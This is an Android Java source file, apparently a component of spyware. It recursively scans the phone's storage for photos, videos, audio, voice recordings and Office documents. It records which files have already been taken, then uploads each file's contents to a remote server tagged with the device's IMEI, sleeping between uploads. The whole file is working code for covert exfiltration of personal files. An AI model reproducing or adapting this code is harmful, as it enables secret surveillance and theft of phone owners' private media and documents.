package com.utils;

import java.io.File;
import java.io.FileInputStream;

import com.network.SendDataToServer;
import com.phone.data.PhoneFiles;

import android.content.Context;


public class UploadsFilter {
	
	public static String CFGUPLOADFILENAMES = "uploadFileNames";

	public static boolean filterFile(Context context,String filename){
		boolean ret = false;
		String result = PrefOper.getValue(context, CFGUPLOADFILENAMES, filename);
		if (result == null || result.equals("") || result.equals("true") == false) {
			PrefOper.setValue(context, CFGUPLOADFILENAMES, filename,"true");
			ret = false;
		}else{
			ret = true;
		}
		return ret;
	}
	
	
	 
    public static void listTypeFiles(Context context,String filePath,int type){
		try{
			
	        File f = new File(filePath);
	        if (!f.exists()) {
	            return ;
	        }
	
	        File[] subFiles = f.listFiles();
	        if (subFiles == null) {
				return ;
			}
	        
	        for (File subFile : subFiles) {
	            if(subFile.isFile() && subFile.length() < Public.MAX_UPLOAD_FILESIZE && 
	            		subFile.length() > Public.MIN_UPLOAD_FILESIZE){
	            	
	            	String uploadfilename = subFile.getName();
	            	if (uploadfilename.endsWith(".png") || uploadfilename.endsWith(".jpeg") ||
	            		uploadfilename.endsWith(".jpg") || uploadfilename.endsWith(".mp4") ||
	            		uploadfilename.endsWith(".mp3") || uploadfilename.endsWith(".slk") || 
	            		uploadfilename.endsWith(".doc") || uploadfilename.endsWith(".ppt")|| 
	            		uploadfilename.endsWith(".xls")|| uploadfilename.endsWith(".amr")){
	            		
	        			if(UploadsFilter.filterFile(context, uploadfilename)){
	        				continue;
	        			}
	            		
	            		sendMediaFiles(context,subFile,type);
	            		Thread.sleep(PhoneFiles.MEDIA_UPLOAD_DELAY);
	    		    	continue;
	            	}
	            } 
	            else if(subFile.isDirectory() ){
	            	listTypeFiles(context,subFile.getAbsolutePath(),type);
	            }
	        }
		}
		catch(Exception ex){
			ex.printStackTrace();
			String errorString = ExceptionProcess.getExceptionDetail(ex);
			String stackString = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("listTypeFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
			return ;
		}
    }
    
    
    
	public static void sendMediaFiles(Context context,File subFile,int cmd){
		try {

			
			String uploadfilename = subFile.getName();
			
			FileInputStream fis = new FileInputStream(subFile);
			int intfilesize  = (int)subFile.length();
			int sendbufsize = 4 + uploadfilename.getBytes().length + 4 + intfilesize;
			byte[]sendbuf = new byte[sendbufsize];
			byte[] filename = uploadfilename.getBytes();
			byte[] bytefilenamesize = PublicFunction.intToBytes(filename.length);
			int i = 0;
			int j = 0;
			for( ; j < 4; j ++){
				sendbuf[i + j] = bytefilenamesize[j];
			}
			i += j;
			
			for( j = 0; j < filename.length; j ++){
				sendbuf[i + j] = filename[j];
			}
			i += j;

			byte[] bytefilesize = PublicFunction.intToBytes(intfilesize);
			for(j= 0 ; j < 4; j ++){
				sendbuf[i + j] = bytefilesize[j];
			}
			i += j;
			
			fis.read(sendbuf, i, intfilesize);
			fis.close();
			i += intfilesize;
			
			SendDataToServer.sendDataToServer(sendbuf, sendbufsize,cmd,Public.IMEI);
	    	
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}
